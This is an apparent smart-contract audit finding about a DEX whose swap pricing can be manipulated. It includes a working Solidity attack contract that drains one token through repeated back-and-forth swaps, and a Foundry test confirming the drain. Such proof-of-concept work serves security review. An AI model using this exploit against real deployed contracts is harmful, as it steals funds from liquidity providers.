### [S-1] Price Manipulation via Unbalanced Token Swaps (Root Cause: Lack of Swap Rate Safeguards + Impact: Token Drain)

**Description:**
The DEX contract allows users to swap between two tokens without enforcing proper safeguards against price manipulation. An attacker can exploit this by performing repeated swaps between the two tokens, artificially manipulating their prices and draining the contract of one of the tokens completely.

**Impact:**

An attacker can drain the entire balance of one of the tokens from the DEX contract. This results in a significant financial loss for the DEX and its liquidity providers, as the tokens locked in the contract can be maliciously extracted by the attacker.

**Proof of Concept:**

Below is the attack contract and test case demonstrating how the exploit can be performed:

<details> 
<summary>Attack Contract Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Dex} from "./Dex.sol";


contract HackDex{
    Dex public dex;
    IERC20 public token1;
    IERC20 public token2;
    constructor(address _dex, address _token1,address _token2){
        dex = Dex(_dex);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function attakc() public{

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        dex.swap(address(token1), address(token2), 10);

        //swap 4 more times
          for (uint i = 0; i < 5; i++) {
            uint256 balance1 = token1.balanceOf(address(this));
            dex.swap(address(token1), address(token2), balance1);

            uint256 balance2 = token2.balanceOf(address(this));
            dex.swap(address(token2), address(token1), balance2);
        }
        

        
    }


}

```
</details>

<details> 
<summary>Test Contract Code</summary>

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Dex} from "../src/Dex.sol";
import {HackDex} from "../src/HackDex.sol";


contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract DexTest is Test {
    Dex public dex;
    // IERC20 public token1;
    // IERC20 public token2;
    MockERC20 public token1;
    MockERC20 public token2;

    HackDex public hackDex;


    function setUp() public {
        dex = new Dex(address(this));
        // token1 = IERC20(Token1);
        // token2 = IERC20(Token2);
        token1 = new MockERC20("Token1", "TKN1");
        token2 = new MockERC20("Token2", "TKN2");

      
        token1.mint(address(this), 110);
        token2.mint(address(this), 110);
        token1.mint(address(dex), 100);
        token2.mint(address(dex), 100);

        dex.setTokens(address(token1), address(token2));

        hackDex = new HackDex(address(dex), address(token1), address(token2));


        // Transfer initial tokens to the HackDex contract
        token1.transfer(address(hackDex), 10);
        token2.transfer(address(hackDex), 10);
    }
  function testAttack() public {
        token1.approve(address(dex), 110);
        token2.approve(address(dex), 110);

        token1.approve(address(hackDex), 110);
        token2.approve(address(hackDex), 110);

        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        hackDex.attakc();


        // Assert the DEX is drained of one of the tokens
        assertEq(token1.balanceOf(address(dex)), 0);
        //assertEq(token2.balanceOf(address(dex)), 0);
    }
}

```
</details> 


**Recommended Mitigation:**

Implement Safeguards Against Price Manipulation and slippage controls.


